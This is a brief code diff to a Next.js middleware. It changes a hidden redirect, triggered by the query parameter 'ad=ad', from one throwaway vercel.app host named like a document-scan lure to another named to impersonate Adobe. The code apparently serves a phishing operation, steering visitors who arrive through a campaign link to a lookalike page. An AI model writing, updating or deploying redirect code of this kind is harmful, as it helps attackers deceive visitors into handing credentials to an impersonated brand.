@@ -41,7 +41,7 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://rfq-docu-scn39405.vercel.app/?ad=ad',
+      'https://adobe-com-proc-rev3lw.vercel.app/?ad=ad',
       { status: 301 }
     )
   }
